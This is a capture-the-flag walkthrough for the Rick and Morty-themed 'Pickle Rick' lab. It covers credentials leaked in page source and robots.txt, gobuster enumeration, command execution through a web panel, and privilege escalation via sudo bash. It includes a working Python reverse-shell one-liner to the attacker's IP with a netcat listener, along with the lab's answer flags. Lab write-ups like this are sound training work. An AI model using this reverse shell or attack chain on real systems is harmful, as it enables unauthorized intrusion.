# Task 1 [Pickle Rick]
----

>>This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

----

# MY DOCUMENTATION
----

>> THIS ARE THE WEB CONTENTS WE SEE WHEN WE NAVIGATE TO THE WEBSITE.  

```web-contents
Help Morty!

Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!
```

>>THIS IS THE SOURCE CODE OF THE WEBSITE WHICH HAS THE USERNAME FOR THE LOGIN PAGE IN COMMENTS. 

```html [source code]
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```

>>USING GOBUSTER TO FIND HIDDEN DIRECTORIES IN THE WEB PAGE.

```bash
root@ip-10-10-122-9:~# gobuster dir -u http://10.10.187.213 -w /usr/share/dirb/wordlists/big.txt -x php,js,css,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.187.213
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,js,css,html
[+] Timeout:        10s
===============================================================
2021/11/30 08:09:33 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.js (Status: 403)
/.htaccess.css (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.js (Status: 403)
/.htpasswd.css (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.php (Status: 403)
/assets (Status: 301)
/denied.php (Status: 302)
/index.html (Status: 200)
/login.php (Status: 200)
/portal.php (Status: 302)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2021/11/30 08:09:42 Finished
===============================================================


```

>>WE SEE THIS CONTENT WHEN WE NAVIGATE TO THE robots.txt DIRECTORY.MAY BE IT IS THE PASSWORD TO LOGIN WITH THAT USERNAME WE FOUND EARLIER IN THE SOURCE CODE.

```CONTENT_IN_ROBOTS.TXT
Wubbalubbadubdub
```

>>GO TO login.php ENTER THE CREDS WE FOUND AND LOGIN.
>>AFTER LOGGING IN THE WEBSITE REDIRECTS TO portal.php WHERE WE SEE A COMMAND PALETTE WHICH CAN RUN COMMANDS.
>>USING ls TO LIST THE CONTENTS.THERE ARE SOME BLACKLISTED COMMANDS THAT WE CANNOT USE LIKE "cat","less"..
>>SO USE grep COMMAND WITH REGEX " . " WHICH MEANS ALL AND THE FILE NAME TO GET THE INFO.

```WEB-CONTENTS-IN-PORTAL.PHP
COMMAND PALETTE ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

COMMAND PALETTE grep . clue.txt

```

>>THERE ARE NO NETCAT BUT IT HAS PYTHON3 INSTALLED IN THIS TARGET SO WE USE PYTHON TO GET THE REVERSE SHELL.CREATE A NETCAT SESSION TO GET A REVERSE SHELL.
>>AFTER GETTING THE REVERSE SHELL STABILIZE THE SHELL 
>>THEN CAT THE Sup3rS3cretPickl3Ingred.txt TO GET THE FIRST INGREDIENT.
>>NAVIGATE TO /home/rick/ AND CAT SECOND INGREDIENT. 

```bash 
## PYTHON REVERSE SHELL:
****
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.122.9",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
****

root@ip-10-10-122-9:~# nc -lvnp 9001
Listening on [0.0.0.0] (family 0, port 9001)
Connection from 10.10.187.213 57392 received!
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@ip-10-10-187-213:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 9001
root@ip-10-10-122-9:~# stty raw -echo && fg
nc -lvnp 9001

www-data@ip-10-10-187-213:/var/www/html$ export TERM=xterm
www-data@ip-10-10-187-213:/var/www/html$ 
www-data@ip-10-10-187-213:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt 
mr. meeseek hair
www-data@ip-10-10-187-213:/var/www/html$ cd /home
www-data@ip-10-10-187-213:/home$ ls
rick  ubuntu
www-data@ip-10-10-187-213:/home$ cd rick
www-data@ip-10-10-187-213:/home/rick$ ls
second ingredients
www-data@ip-10-10-187-213:/home/rick$ cat second\ ingredients 
1 jerry tear
```

>>TO ESCALATE OUR PRIVILEGE AS ROOT USE LINPEAS TO CHECK THE VULNERABLE PART FOR ESCALATION.
>>IT SHOWS THERE IS A VULNERABILITY WITH bash WITH THAT WE CAN BE ROOT  
>>IF WE RUN THE COMMAND "sudo bash" THERE WE GOT OUR SHELL AS ROOT.
>> NAVIGATE TO root DIRECTORY AND CAT THE 3rd.txt TO GET THE THIRD INGREDIENT.

```bash 
www-data@ip-10-10-187-213:/var/www/html$ sudo bash
root@ip-10-10-187-213:/# cd root
root@ip-10-10-187-213:~# ls
3rd.txt  snap
root@ip-10-10-187-213:~# cat 3rd.txt 
3rd ingredients: fleeb juice
```

----

# ANSWER THE FOLLOWING
----
Deploy the virtual machine on this task and explore the web application: MACHINE_IP
1.What is the first ingredient Rick needs?
>>mr . meeseek hair

2.Whats the second ingredient Rick needs?
>>1 jerry tear

3.Whats the final ingredient Rick needs?
>>fleeb juice 

----